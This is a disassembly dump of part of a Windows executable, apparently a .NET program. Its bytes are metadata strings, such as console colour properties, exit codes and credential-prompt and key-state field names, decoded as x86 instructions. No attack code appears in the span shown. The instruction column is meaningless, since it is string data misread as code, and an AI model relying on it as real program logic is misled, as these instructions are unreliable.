  4077bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4077bc:	6c                   	insb   (%dx),%es:(%edi)
  4077bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4077be:	72 00                	jb     0x4077c0
  4077c0:	67 65 74 5f          	addr16 gs je 0x407823
  4077c4:	45                   	inc    %ebp
  4077c5:	72 72                	jb     0x407839
  4077c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4077c8:	72 42                	jb     0x40780c
  4077ca:	61                   	popa
  4077cb:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4077ce:	72 6f                	jb     0x40783f
  4077d0:	75 6e                	jne    0x407840
  4077d2:	64 43                	fs inc %ebx
  4077d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4077d5:	6c                   	insb   (%dx),%es:(%edi)
  4077d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4077d7:	72 00                	jb     0x4077d9
  4077d9:	73 65                	jae    0x407840
  4077db:	74 5f                	je     0x40783c
  4077dd:	45                   	inc    %ebp
  4077de:	72 72                	jb     0x407852
  4077e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4077e1:	72 42                	jb     0x407825
  4077e3:	61                   	popa
  4077e4:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4077e7:	72 6f                	jb     0x407858
  4077e9:	75 6e                	jne    0x407859
  4077eb:	64 43                	fs inc %ebx
  4077ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4077ee:	6c                   	insb   (%dx),%es:(%edi)
  4077ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4077f0:	72 00                	jb     0x4077f2
  4077f2:	67 65 74 5f          	addr16 gs je 0x407855
  4077f6:	57                   	push   %edi
  4077f7:	61                   	popa
  4077f8:	72 6e                	jb     0x407868
  4077fa:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  407801:	67 72 6f             	addr16 jb 0x407873
  407804:	75 6e                	jne    0x407874
  407806:	64 43                	fs inc %ebx
  407808:	6f                   	outsl  %ds:(%esi),(%dx)
  407809:	6c                   	insb   (%dx),%es:(%edi)
  40780a:	6f                   	outsl  %ds:(%esi),(%dx)
  40780b:	72 00                	jb     0x40780d
  40780d:	73 65                	jae    0x407874
  40780f:	74 5f                	je     0x407870
  407811:	57                   	push   %edi
  407812:	61                   	popa
  407813:	72 6e                	jb     0x407883
  407815:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  40781c:	67 72 6f             	addr16 jb 0x40788e
  40781f:	75 6e                	jne    0x40788f
  407821:	64 43                	fs inc %ebx
  407823:	6f                   	outsl  %ds:(%esi),(%dx)
  407824:	6c                   	insb   (%dx),%es:(%edi)
  407825:	6f                   	outsl  %ds:(%esi),(%dx)
  407826:	72 00                	jb     0x407828
  407828:	67 65 74 5f          	addr16 gs je 0x40788b
  40782c:	57                   	push   %edi
  40782d:	61                   	popa
  40782e:	72 6e                	jb     0x40789e
  407830:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407837:	67 72 6f             	addr16 jb 0x4078a9
  40783a:	75 6e                	jne    0x4078aa
  40783c:	64 43                	fs inc %ebx
  40783e:	6f                   	outsl  %ds:(%esi),(%dx)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	6f                   	outsl  %ds:(%esi),(%dx)
  407841:	72 00                	jb     0x407843
  407843:	73 65                	jae    0x4078aa
  407845:	74 5f                	je     0x4078a6
  407847:	57                   	push   %edi
  407848:	61                   	popa
  407849:	72 6e                	jb     0x4078b9
  40784b:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407852:	67 72 6f             	addr16 jb 0x4078c4
  407855:	75 6e                	jne    0x4078c5
  407857:	64 43                	fs inc %ebx
  407859:	6f                   	outsl  %ds:(%esi),(%dx)
  40785a:	6c                   	insb   (%dx),%es:(%edi)
  40785b:	6f                   	outsl  %ds:(%esi),(%dx)
  40785c:	72 00                	jb     0x40785e
  40785e:	67 65 74 5f          	addr16 gs je 0x4078c1
  407862:	44                   	inc    %esp
  407863:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407867:	46                   	inc    %esi
  407868:	6f                   	outsl  %ds:(%esi),(%dx)
  407869:	72 65                	jb     0x4078d0
  40786b:	67 72 6f             	addr16 jb 0x4078dd
  40786e:	75 6e                	jne    0x4078de
  407870:	64 43                	fs inc %ebx
  407872:	6f                   	outsl  %ds:(%esi),(%dx)
  407873:	6c                   	insb   (%dx),%es:(%edi)
  407874:	6f                   	outsl  %ds:(%esi),(%dx)
  407875:	72 00                	jb     0x407877
  407877:	73 65                	jae    0x4078de
  407879:	74 5f                	je     0x4078da
  40787b:	44                   	inc    %esp
  40787c:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407880:	46                   	inc    %esi
  407881:	6f                   	outsl  %ds:(%esi),(%dx)
  407882:	72 65                	jb     0x4078e9
  407884:	67 72 6f             	addr16 jb 0x4078f6
  407887:	75 6e                	jne    0x4078f7
  407889:	64 43                	fs inc %ebx
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	6c                   	insb   (%dx),%es:(%edi)
  40788d:	6f                   	outsl  %ds:(%esi),(%dx)
  40788e:	72 00                	jb     0x407890
  407890:	67 65 74 5f          	addr16 gs je 0x4078f3
  407894:	44                   	inc    %esp
  407895:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407899:	42                   	inc    %edx
  40789a:	61                   	popa
  40789b:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40789e:	72 6f                	jb     0x40790f
  4078a0:	75 6e                	jne    0x407910
  4078a2:	64 43                	fs inc %ebx
  4078a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a5:	6c                   	insb   (%dx),%es:(%edi)
  4078a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a7:	72 00                	jb     0x4078a9
  4078a9:	73 65                	jae    0x407910
  4078ab:	74 5f                	je     0x40790c
  4078ad:	44                   	inc    %esp
  4078ae:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4078b2:	42                   	inc    %edx
  4078b3:	61                   	popa
  4078b4:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4078b7:	72 6f                	jb     0x407928
  4078b9:	75 6e                	jne    0x407929
  4078bb:	64 43                	fs inc %ebx
  4078bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078be:	6c                   	insb   (%dx),%es:(%edi)
  4078bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4078c0:	72 00                	jb     0x4078c2
  4078c2:	67 65 74 5f          	addr16 gs je 0x407925
  4078c6:	56                   	push   %esi
  4078c7:	65 72 62             	gs jb  0x40792c
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	73 65                	jae    0x407932
  4078cd:	46                   	inc    %esi
  4078ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cf:	72 65                	jb     0x407936
  4078d1:	67 72 6f             	addr16 jb 0x407943
  4078d4:	75 6e                	jne    0x407944
  4078d6:	64 43                	fs inc %ebx
  4078d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d9:	6c                   	insb   (%dx),%es:(%edi)
  4078da:	6f                   	outsl  %ds:(%esi),(%dx)
  4078db:	72 00                	jb     0x4078dd
  4078dd:	73 65                	jae    0x407944
  4078df:	74 5f                	je     0x407940
  4078e1:	56                   	push   %esi
  4078e2:	65 72 62             	gs jb  0x407947
  4078e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4078e6:	73 65                	jae    0x40794d
  4078e8:	46                   	inc    %esi
  4078e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ea:	72 65                	jb     0x407951
  4078ec:	67 72 6f             	addr16 jb 0x40795e
  4078ef:	75 6e                	jne    0x40795f
  4078f1:	64 43                	fs inc %ebx
  4078f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f4:	6c                   	insb   (%dx),%es:(%edi)
  4078f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f6:	72 00                	jb     0x4078f8
  4078f8:	67 65 74 5f          	addr16 gs je 0x40795b
  4078fc:	56                   	push   %esi
  4078fd:	65 72 62             	gs jb  0x407962
  407900:	6f                   	outsl  %ds:(%esi),(%dx)
  407901:	73 65                	jae    0x407968
  407903:	42                   	inc    %edx
  407904:	61                   	popa
  407905:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407908:	72 6f                	jb     0x407979
  40790a:	75 6e                	jne    0x40797a
  40790c:	64 43                	fs inc %ebx
  40790e:	6f                   	outsl  %ds:(%esi),(%dx)
  40790f:	6c                   	insb   (%dx),%es:(%edi)
  407910:	6f                   	outsl  %ds:(%esi),(%dx)
  407911:	72 00                	jb     0x407913
  407913:	73 65                	jae    0x40797a
  407915:	74 5f                	je     0x407976
  407917:	56                   	push   %esi
  407918:	65 72 62             	gs jb  0x40797d
  40791b:	6f                   	outsl  %ds:(%esi),(%dx)
  40791c:	73 65                	jae    0x407983
  40791e:	42                   	inc    %edx
  40791f:	61                   	popa
  407920:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407923:	72 6f                	jb     0x407994
  407925:	75 6e                	jne    0x407995
  407927:	64 43                	fs inc %ebx
  407929:	6f                   	outsl  %ds:(%esi),(%dx)
  40792a:	6c                   	insb   (%dx),%es:(%edi)
  40792b:	6f                   	outsl  %ds:(%esi),(%dx)
  40792c:	72 00                	jb     0x40792e
  40792e:	67 65 74 5f          	addr16 gs je 0x407991
  407932:	50                   	push   %eax
  407933:	72 6f                	jb     0x4079a4
  407935:	67 72 65             	addr16 jb 0x40799d
  407938:	73 73                	jae    0x4079ad
  40793a:	46                   	inc    %esi
  40793b:	6f                   	outsl  %ds:(%esi),(%dx)
  40793c:	72 65                	jb     0x4079a3
  40793e:	67 72 6f             	addr16 jb 0x4079b0
  407941:	75 6e                	jne    0x4079b1
  407943:	64 43                	fs inc %ebx
  407945:	6f                   	outsl  %ds:(%esi),(%dx)
  407946:	6c                   	insb   (%dx),%es:(%edi)
  407947:	6f                   	outsl  %ds:(%esi),(%dx)
  407948:	72 00                	jb     0x40794a
  40794a:	73 65                	jae    0x4079b1
  40794c:	74 5f                	je     0x4079ad
  40794e:	50                   	push   %eax
  40794f:	72 6f                	jb     0x4079c0
  407951:	67 72 65             	addr16 jb 0x4079b9
  407954:	73 73                	jae    0x4079c9
  407956:	46                   	inc    %esi
  407957:	6f                   	outsl  %ds:(%esi),(%dx)
  407958:	72 65                	jb     0x4079bf
  40795a:	67 72 6f             	addr16 jb 0x4079cc
  40795d:	75 6e                	jne    0x4079cd
  40795f:	64 43                	fs inc %ebx
  407961:	6f                   	outsl  %ds:(%esi),(%dx)
  407962:	6c                   	insb   (%dx),%es:(%edi)
  407963:	6f                   	outsl  %ds:(%esi),(%dx)
  407964:	72 00                	jb     0x407966
  407966:	67 65 74 5f          	addr16 gs je 0x4079c9
  40796a:	50                   	push   %eax
  40796b:	72 6f                	jb     0x4079dc
  40796d:	67 72 65             	addr16 jb 0x4079d5
  407970:	73 73                	jae    0x4079e5
  407972:	42                   	inc    %edx
  407973:	61                   	popa
  407974:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407977:	72 6f                	jb     0x4079e8
  407979:	75 6e                	jne    0x4079e9
  40797b:	64 43                	fs inc %ebx
  40797d:	6f                   	outsl  %ds:(%esi),(%dx)
  40797e:	6c                   	insb   (%dx),%es:(%edi)
  40797f:	6f                   	outsl  %ds:(%esi),(%dx)
  407980:	72 00                	jb     0x407982
  407982:	73 65                	jae    0x4079e9
  407984:	74 5f                	je     0x4079e5
  407986:	50                   	push   %eax
  407987:	72 6f                	jb     0x4079f8
  407989:	67 72 65             	addr16 jb 0x4079f1
  40798c:	73 73                	jae    0x407a01
  40798e:	42                   	inc    %edx
  40798f:	61                   	popa
  407990:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407993:	72 6f                	jb     0x407a04
  407995:	75 6e                	jne    0x407a05
  407997:	64 43                	fs inc %ebx
  407999:	6f                   	outsl  %ds:(%esi),(%dx)
  40799a:	6c                   	insb   (%dx),%es:(%edi)
  40799b:	6f                   	outsl  %ds:(%esi),(%dx)
  40799c:	72 00                	jb     0x40799e
  40799e:	67 65 74 5f          	addr16 gs je 0x407a01
  4079a2:	53                   	push   %ebx
  4079a3:	68 6f 75 6c 64       	push   $0x646c756f
  4079a8:	45                   	inc    %ebp
  4079a9:	78 69                	js     0x407a14
  4079ab:	74 00                	je     0x4079ad
  4079ad:	73 65                	jae    0x407a14
  4079af:	74 5f                	je     0x407a10
  4079b1:	53                   	push   %ebx
  4079b2:	68 6f 75 6c 64       	push   $0x646c756f
  4079b7:	45                   	inc    %ebp
  4079b8:	78 69                	js     0x407a23
  4079ba:	74 00                	je     0x4079bc
  4079bc:	67 65 74 5f          	addr16 gs je 0x407a1f
  4079c0:	45                   	inc    %ebp
  4079c1:	78 69                	js     0x407a2c
  4079c3:	74 43                	je     0x407a08
  4079c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4079c6:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4079cb:	74 5f                	je     0x407a2c
  4079cd:	45                   	inc    %ebp
  4079ce:	78 69                	js     0x407a39
  4079d0:	74 43                	je     0x407a15
  4079d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d3:	64 65 00 53 68       	fs add %dl,%gs:0x68(%ebx)
  4079d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d9:	75 6c                	jne    0x407a47
  4079db:	64 45                	fs inc %ebp
  4079dd:	78 69                	js     0x407a48
  4079df:	74 00                	je     0x4079e1
  4079e1:	45                   	inc    %ebp
  4079e2:	78 69                	js     0x407a4d
  4079e4:	74 43                	je     0x407a29
  4079e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e7:	64 65 00 73 68       	fs add %dh,%gs:0x68(%ebx)
  4079ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ed:	75 6c                	jne    0x407a5b
  4079ef:	64 45                	fs inc %ebp
  4079f1:	78 69                	js     0x407a5c
  4079f3:	74 00                	je     0x4079f5
  4079f5:	65 78 69             	gs js  0x407a61
  4079f8:	74 43                	je     0x407a3d
  4079fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4079fb:	64 65 00 4d 61       	fs add %cl,%gs:0x61(%ebp)
  407a00:	69 6e 00 55 6e 68 61 	imul   $0x61686e55,0x0(%esi),%ebp
  407a07:	6e                   	outsb  %ds:(%esi),(%dx)
  407a08:	64 6c                	fs insb (%dx),%es:(%edi)
  407a0a:	65 64 45             	gs fs inc %ebp
  407a0d:	78 63                	js     0x407a72
  407a0f:	65 70 74             	gs jo  0x407a86
  407a12:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  407a19:	74 41                	je     0x407a5c
  407a1b:	72 67                	jb     0x407a84
  407a1d:	73 00                	jae    0x407a1f
  407a1f:	43                   	inc    %ebx
  407a20:	75 72                	jne    0x407a94
  407a22:	72 65                	jb     0x407a89
  407a24:	6e                   	outsb  %ds:(%esi),(%dx)
  407a25:	74 44                	je     0x407a6b
  407a27:	6f                   	outsl  %ds:(%esi),(%dx)
  407a28:	6d                   	insl   (%dx),%es:(%edi)
  407a29:	61                   	popa
  407a2a:	69 6e 5f 55 6e 68 61 	imul   $0x61686e55,0x5f(%esi),%ebp
  407a31:	6e                   	outsb  %ds:(%esi),(%dx)
  407a32:	64 6c                	fs insb (%dx),%es:(%edi)
  407a34:	65 64 45             	gs fs inc %ebp
  407a37:	78 63                	js     0x407a9c
  407a39:	65 70 74             	gs jo  0x407ab0
  407a3c:	69 6f 6e 00 63 72 65 	imul   $0x65726300,0x6e(%edi),%ebp
  407a43:	64 69 6e 66 6f 00 74 	imul   $0x6174006f,%fs:0x66(%esi),%ebp
  407a4a:	61 
  407a4b:	72 67                	jb     0x407ab4
  407a4d:	65 74 4e             	gs je  0x407a9e
  407a50:	61                   	popa
  407a51:	6d                   	insl   (%dx),%es:(%edi)
  407a52:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  407a56:	73 65                	jae    0x407abd
  407a58:	72 76                	jb     0x407ad0
  407a5a:	65 64 31 00          	gs xor %eax,%fs:(%eax)
  407a5e:	69 45 72 72 6f 72 00 	imul   $0x726f72,0x72(%ebp),%eax
  407a65:	75 73                	jne    0x407ada
  407a67:	65 72 4e             	gs jb  0x407ab8
  407a6a:	61                   	popa
  407a6b:	6d                   	insl   (%dx),%es:(%edi)
  407a6c:	65 00 6d 61          	add    %ch,%gs:0x61(%ebp)
  407a70:	78 55                	js     0x407ac7
  407a72:	73 65                	jae    0x407ad9
  407a74:	72 4e                	jb     0x407ac4
  407a76:	61                   	popa
  407a77:	6d                   	insl   (%dx),%es:(%edi)
  407a78:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  407a7c:	73 73                	jae    0x407af1
  407a7e:	77 6f                	ja     0x407aef
  407a80:	72 64                	jb     0x407ae6
  407a82:	00 6d 61             	add    %ch,0x61(%ebp)
  407a85:	78 50                	js     0x407ad7
  407a87:	61                   	popa
  407a88:	73 73                	jae    0x407afd
  407a8a:	77 6f                	ja     0x407afb
  407a8c:	72 64                	jb     0x407af2
  407a8e:	00 70 66             	add    %dh,0x66(%eax)
  407a91:	53                   	push   %ebx
  407a92:	61                   	popa
  407a93:	76 65                	jbe    0x407afa
  407a95:	00 53 79             	add    %dl,0x79(%ebx)
  407a98:	73 74                	jae    0x407b0e
  407a9a:	65 6d                	gs insl (%dx),%es:(%edi)
  407a9c:	2e 52                	cs push %edx
  407a9e:	75 6e                	jne    0x407b0e
  407aa0:	74 69                	je     0x407b0b
  407aa2:	6d                   	insl   (%dx),%es:(%edi)
  407aa3:	65 2e 49             	gs cs dec %ecx
  407aa6:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa7:	74 65                	je     0x407b0e
  407aa9:	72 6f                	jb     0x407b1a
  407aab:	70 53                	jo     0x407b00
  407aad:	65 72 76             	gs jb  0x407b26
  407ab0:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  407ab7:	72 73                	jb     0x407b2c
  407ab9:	68 61 6c 41 73       	push   $0x73416c61
  407abe:	41                   	inc    %ecx
  407abf:	74 74                	je     0x407b35
  407ac1:	72 69                	jb     0x407b2c
  407ac3:	62 75 74             	bound  %esi,0x74(%ebp)
  407ac6:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  407aca:	6d                   	insl   (%dx),%es:(%edi)
  407acb:	61                   	popa
  407acc:	6e                   	outsb  %ds:(%esi),(%dx)
  407acd:	61                   	popa
  407ace:	67 65 64 54          	addr16 gs fs push %esp
  407ad2:	79 70                	jns    0x407b44
  407ad4:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  407ad8:	61                   	popa
  407ad9:	67 73 00             	addr16 jae 0x407adc
  407adc:	63 61 70             	arpl   %esp,0x70(%ecx)
  407adf:	74 69                	je     0x407b4a
  407ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ae3:	00 6d 65             	add    %ch,0x65(%ebp)
  407ae6:	73 73                	jae    0x407b5b
  407ae8:	61                   	popa
  407ae9:	67 65 00 74 61       	add    %dh,%gs:0x61(%si)
  407aee:	72 67                	jb     0x407b57
  407af0:	65 74 00             	gs je  0x407af3
  407af3:	75 73                	jne    0x407b68
  407af5:	65 72 00             	gs jb  0x407af8
  407af8:	63 72 65             	arpl   %esi,0x65(%edx)
  407afb:	64 54                	fs push %esp
  407afd:	79 70                	jns    0x407b6f
  407aff:	65 73 00             	gs jae 0x407b02
  407b02:	6f                   	outsl  %ds:(%esi),(%dx)
  407b03:	70 74                	jo     0x407b79
  407b05:	69 6f 6e 73 00 76 61 	imul   $0x61760073,0x6e(%edi),%ebp
  407b0c:	6c                   	insb   (%dx),%es:(%edi)
  407b0d:	75 65                	jne    0x407b74
  407b0f:	00 72 65             	add    %dh,0x65(%edx)
  407b12:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  407b16:	67 6c                	insb   (%dx),%es:(%di)
  407b18:	65 00 73 6f          	add    %dh,%gs:0x6f(%ebx)
  407b1c:	75 72                	jne    0x407b90
  407b1e:	63 65 00             	arpl   %esp,0x0(%ebp)
  407b21:	64 65 73 74          	fs gs jae 0x407b99
  407b25:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  407b2c:	00 63 6c             	add    %ah,0x6c(%ebx)
  407b2f:	69 70 00 66 69 6c 6c 	imul   $0x6c6c6966,0x0(%eax),%esi
  407b36:	00 6f 72             	add    %ch,0x72(%edi)
  407b39:	69 67 69 6e 00 63 6f 	imul   $0x6f63006e,0x69(%edi),%esp
  407b40:	6e                   	outsb  %ds:(%esi),(%dx)
  407b41:	74 65                	je     0x407ba8
  407b43:	6e                   	outsb  %ds:(%esi),(%dx)
  407b44:	74 73                	je     0x407bb9
  407b46:	00 73 74             	add    %dh,0x74(%ebx)
  407b49:	72 49                	jb     0x407b94
  407b4b:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  407b4f:	72 54                	jb     0x407ba5
  407b51:	69 74 6c 65 00 73 74 	imul   $0x72747300,0x65(%esp,%ebp,2),%esi
  407b58:	72 
  407b59:	50                   	push   %eax
  407b5a:	72 6f                	jb     0x407bcb
  407b5c:	6d                   	insl   (%dx),%es:(%edi)
  407b5d:	70 74                	jo     0x407bd3
  407b5f:	00 73 74             	add    %dh,0x74(%ebx)
  407b62:	72 56                	jb     0x407bba
  407b64:	61                   	popa
  407b65:	6c                   	insb   (%dx),%es:(%edi)
  407b66:	00 62 6c             	add    %ah,0x6c(%edx)
  407b69:	53                   	push   %ebx
  407b6a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407b6e:	65 00 61 72          	add    %ah,%gs:0x72(%ecx)
  407b72:	72 43                	jb     0x407bb7
  407b74:	68 6f 69 63 65       	push   $0x6563696f
  407b79:	00 69 6e             	add    %ch,0x6e(%ecx)
  407b7c:	74 44                	je     0x407bc2
  407b7e:	65 66 61             	gs popaw
  407b81:	75 6c                	jne    0x407bef
  407b83:	74 00                	je     0x407b85
  407b85:	77 56                	ja     0x407bdd
  407b87:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  407b8e:	77 53                	ja     0x407be3
  407b90:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  407b93:	43                   	inc    %ebx
  407b94:	6f                   	outsl  %ds:(%esi),(%dx)
  407b95:	64 65 00 6c 70 4b    	fs add %ch,%gs:0x4b(%eax,%esi,2)
  407b9b:	65 79 53             	gs jns 0x407bf1
  407b9e:	74 61                	je     0x407c01
  407ba0:	74 65                	je     0x407c07
  407ba2:	00 70 77             	add    %dh,0x77(%eax)
  407ba5:	73 7a                	jae    0x407c21
  407ba7:	42                   	inc    %edx
  407ba8:	75 66                	jne    0x407c10
  407baa:	66 00 4f 75          	data16 add %cl,0x75(%edi)
  407bae:	74 41                	je     0x407bf1
  407bb0:	74 74                	je     0x407c26
  407bb2:	72 69                	jb     0x407c1d
  407bb4:	62 75 74             	bound  %esi,0x74(%ebp)
  407bb7:	65 00 63 63          	add    %ah,%gs:0x63(%ebx)
  407bbb:	68 42 75 66 66       	push   $0x66667542
  407bc0:	00 77 46             	add    %dh,0x46(%edi)
  407bc3:	6c                   	insb   (%dx),%es:(%edi)
  407bc4:	61                   	popa
  407bc5:	67 73 00             	addr16 jae 0x407bc8
  407bc8:	6b 65 79 73          	imul   $0x73,0x79(%ebp),%esp
  407bcc:	00 62 6c             	add    %ah,0x6c(%edx)
  407bcf:	53                   	push   %ebx
  407bd0:	68 69 66 74 00       	push   $0x746669
  407bd5:	62 6c 41 6c          	bound  %ebp,0x6c(%ecx,%eax,2)
  407bd9:	74 47                	je     0x407c22
  407bdb:	72 00                	jb     0x407bdd
  407bdd:	62 6c 49 6e          	bound  %ebp,0x6e(%ecx,%ecx,2)
  407be1:	63 6c 75 64          	arpl   %ebp,0x64(%ebp,%esi,2)
  407be5:	65 4b                	gs dec %ebx
  407be7:	65 79 44             	gs jns 0x407c2e
  407bea:	6f                   	outsl  %ds:(%esi),(%dx)
  407beb:	77 6e                	ja     0x407c5b
  407bed:	00 73 65             	add    %dh,0x65(%ebx)
  407bf0:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf1:	64 65 72 00          	fs gs jb 0x407bf5
  407bf5:	65 00 63 6f          	add    %ah,%gs:0x6f(%ebx)
  407bf9:	6c                   	insb   (%dx),%es:(%edi)
  407bfa:	6f                   	outsl  %ds:(%esi),(%dx)
  407bfb:	72 00                	jb     0x407bfd
  407bfd:	42                   	inc    %edx
  407bfe:	61                   	popa
  407bff:	72 43                	jb     0x407c44
  407c01:	6f                   	outsl  %ds:(%esi),(%dx)
  407c02:	6c                   	insb   (%dx),%es:(%edi)
  407c03:	6f                   	outsl  %ds:(%esi),(%dx)
  407c04:	72 00                	jb     0x407c06
  407c06:	54                   	push   %esp
  407c07:	69 74 6c 65 00 70 64 	imul   $0x647000,0x65(%esp,%ebp,2),%esi
  407c0e:	00 
  407c0f:	70 6f                	jo     0x407c80
  407c11:	73 69                	jae    0x407c7c
  407c13:	74 69                	je     0x407c7e
  407c15:	6f                   	outsl  %ds:(%esi),(%dx)
  407c16:	6e                   	outsb  %ds:(%esi),(%dx)
  407c17:	00 6f 62             	add    %ch,0x62(%edi)
  407c1a:	6a 52                	push   $0x52
  407c1c:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  407c20:	64 00 64 65 73       	add    %ah,%fs:0x73(%ebp,%eiz,2)
  407c25:	63 72 69             	arpl   %esi,0x69(%edx)
  407c28:	70 74                	jo     0x407c9e
  407c2a:	69 6f 6e 73 00 63 68 	imul   $0x68630073,0x6e(%edi),%ebp
  407c31:	6f                   	outsl  %ds:(%esi),(%dx)
  407c32:	69 63 65 73 00 64 65 	imul   $0x65640073,0x65(%ebx),%esp
  407c39:	66 61                	popaw
  407c3b:	75 6c                	jne    0x407ca9
  407c3d:	74 43                	je     0x407c82
  407c3f:	68 6f 69 63 65       	push   $0x6563696f
  407c44:	00 61 6c             	add    %ah,0x6c(%ecx)
  407c47:	6c                   	insb   (%dx),%es:(%edi)
  407c48:	6f                   	outsl  %ds:(%esi),(%dx)
  407c49:	77 65                	ja     0x407cb0
  407c4b:	64 43                	fs inc %ebx
  407c4d:	72 65                	jb     0x407cb4
  407c4f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407c52:	74 69                	je     0x407cbd
  407c54:	61                   	popa
  407c55:	6c                   	insb   (%dx),%es:(%edi)
  407c56:	54                   	push   %esp
  407c57:	79 70                	jns    0x407cc9
  407c59:	65 73 00             	gs jae 0x407c5c
  407c5c:	66 6f                	outsw  %ds:(%esi),(%dx)
  407c5e:	72 65                	jb     0x407cc5
  407c60:	67 72 6f             	addr16 jb 0x407cd2
  407c63:	75 6e                	jne    0x407cd3
  407c65:	64 43                	fs inc %ebx
  407c67:	6f                   	outsl  %ds:(%esi),(%dx)
  407c68:	6c                   	insb   (%dx),%es:(%edi)
  407c69:	6f                   	outsl  %ds:(%esi),(%dx)
  407c6a:	72 00                	jb     0x407c6c
  407c6c:	62 61 63             	bound  %esp,0x63(%ecx)
  407c6f:	6b 67 72 6f          	imul   $0x6f,0x72(%edi),%esp
  407c73:	75 6e                	jne    0x407ce3
  407c75:	64 43                	fs inc %ebx
  407c77:	6f                   	outsl  %ds:(%esi),(%dx)
  407c78:	6c                   	insb   (%dx),%es:(%edi)
  407c79:	6f                   	outsl  %ds:(%esi),(%dx)
  407c7a:	72 00                	jb     0x407c7c
  407c7c:	73 6f                	jae    0x407ced
  407c7e:	75 72                	jne    0x407cf2
  407c80:	63 65 49             	arpl   %esp,0x49(%ebp)
  407c83:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  407c87:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407c8a:	64 00 61 70          	add    %ah,%fs:0x70(%ecx)
  407c8e:	70 00                	jo     0x407c90
  407c90:	61                   	popa
  407c91:	72 67                	jb     0x407cfa
  407c93:	73 00                	jae    0x407c95
  407c95:	53                   	push   %ebx
  407c96:	79 73                	jns    0x407d0b
  407c98:	74 65                	je     0x407cff
  407c9a:	6d                   	insl   (%dx),%es:(%edi)
  407c9b:	2e 52                	cs push %edx
  407c9d:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  407ca0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407ca5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca6:	00 41 73             	add    %al,0x73(%ecx)
  407ca9:	73 65                	jae    0x407d10
  407cab:	6d                   	insl   (%dx),%es:(%edi)
  407cac:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407cb0:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  407cb7:	72 
  407cb8:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407cbf:	73 73                	jae    0x407d34
  407cc1:	65 6d                	gs insl (%dx),%es:(%edi)
  407cc3:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  407cc7:	72 6f                	jb     0x407d38
  407cc9:	64 75 63             	fs jne 0x407d2f
  407ccc:	74 41                	je     0x407d0f
  407cce:	74 74                	je     0x407d44
  407cd0:	72 69                	jb     0x407d3b
  407cd2:	62 75 74             	bound  %esi,0x74(%ebp)
  407cd5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
